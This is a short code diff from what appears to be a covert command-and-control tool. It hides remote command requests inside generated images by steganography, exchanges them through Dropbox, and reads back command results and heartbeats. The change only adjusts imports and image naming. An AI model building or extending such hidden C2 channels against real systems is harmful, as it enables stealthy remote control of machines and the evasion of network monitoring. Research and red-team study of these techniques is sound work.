@@ -2,12 +2,13 @@ from typing import List
 
 from common.data.heartbeat import Heartbeat
 from common.dropbox_wrapper import list_files, DropboxFolders, create_folder, upload_file, \
-    list_files_in_folder, download_file, delete_file_in_folder, download_all_files_from_folder, download_file_to_path
+    list_files_in_folder, delete_file_in_folder, download_all_files_from_folder, download_file_to_path
 from common.data.commands import CommandExecutionRequest, CommandExecutionResult
 from common.image_generators.image_generator import generate_image
 from common.steganography import insert_command_request_into_image, read_command_result_from_image, \
     read_heartbeat_from_image
 from common.utils.string_utils import generate_unique_image_name
+from data.properties import get_properties
 
 __IMAGE_HORIZONTAL_DIMENSION = 640
 __IMAGE_VERTICAL_DIMENSION = 480
@@ -37,7 +38,9 @@ def __create_missing_folders(folders: List[DropboxFolders]) -> None:
 def upload_command_to_dropbox(command: CommandExecutionRequest) -> None:
     generated_image = generate_image(__IMAGE_HORIZONTAL_DIMENSION, __IMAGE_VERTICAL_DIMENSION)
     image_with_secret = insert_command_request_into_image(generated_image, command)
-    upload_file(DropboxFolders.COMMAND_REQUESTS, generate_unique_image_name(), image_with_secret)
+    upload_file(DropboxFolders.COMMAND_REQUESTS,
+                generate_unique_image_name(get_properties().image_generator_mode),
+                image_with_secret)
 
 
 def download_and_delete_command_execution_results_from_dropbox() -> List[CommandExecutionResult]:
